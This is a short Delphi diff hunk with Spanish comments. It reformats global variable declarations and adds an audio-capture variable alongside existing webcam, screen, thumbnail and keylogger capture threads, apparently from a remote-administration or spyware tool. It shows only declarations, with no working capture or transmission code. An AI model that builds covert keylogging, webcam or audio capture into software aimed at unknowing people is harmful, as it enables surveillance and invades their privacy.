@@ -18,10 +18,11 @@ var
 
   StopSearch : Boolean; //Para parar de buscar
   
-  CapturaWebcam : string;   //Variables para los diferentes threads
-  CapturaPantalla : string;
-  CapturaThumb : string;
-  CapturaKeylogger : string;
+  CapturaWebcam         : string;   //Variables para el thread 
+  CapturaPantalla       : string;
+  CapturaThumb          : string;
+  CapturaKeylogger      : string;
+  CapturaAudio          : string;
   pararcapturathread : boolean;
 
   id1: longword = 0;
